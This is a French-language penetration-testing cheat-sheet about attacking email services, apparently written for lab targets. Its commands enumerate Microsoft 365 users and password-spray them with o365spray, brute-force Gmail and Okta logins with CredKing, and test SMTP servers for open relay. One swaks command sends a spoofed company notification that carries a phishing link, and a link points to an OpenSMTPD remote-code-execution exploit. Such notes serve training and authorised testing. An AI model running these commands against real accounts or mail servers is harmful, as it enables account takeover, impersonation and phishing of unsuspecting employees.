
- [ ] [[#EVOLUTION]]
- [ ] [[#1. BRUTEFORCE USERS]]
- [ ] [[#2. CLOUD ENUMERATION]]
- [ ] [[#3. SMTP OPEN RELAY]]
- [ ] [[#4. CVEs]]



---

# EVOLUTION

Permet d'interagir avec IMAP et SMTP

```shell
sudo apt-get install evolution
```

si erreur "bwrap: Can't create file at ...", lancer avec cette commande
```
export WEBKIT_FORCE_SANDBOX=0 && evolution
```



---

# 1. BRUTEFORCE USERS

[[Bruteforce en ligne#POP3]]



---

# 2. CLOUD ENUMERATION

## M365

#### O365Spray

https://github.com/0xZDH/o365spray

```bash
git clone https://github.com/0xZDH/o365spray.git
```

Vérification que le domaine utilise M365

```shell
python3 o365spray.py --validate --domain msplaintext.xyz
```

Bruteforce de users

```sh
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

Password spraying

```sh
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```


## GMAIL / OKTA

https://github.com/ustayready/CredKing

```bash
git clone https://github.com/ustayready/CredKing
```

Bruteforce GMAIL

```
credking.py --plugin gmail --threads 64 --userfile USERFILE --passwordfile PASSWORDFILE
```

Bruteforce OKTA

```
credking.py --plugin okta --threads 64 --userfile USERFILE --passwordfile PASSWORDFILE --oktadomain org.okta.com
```


---

# 3. SMTP OPEN RELAY


Vérifier si possible d'envoyer des mails avec des adresses qui n'existent pas ou usurper @ existante
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```

Envoi de mail en usurpant une adresse
```shell
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```


---

# 4. CVEs


## [CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247)

OpenSMTPD < 6.6.2

RCE https://www.exploit-db.com/exploits/47984
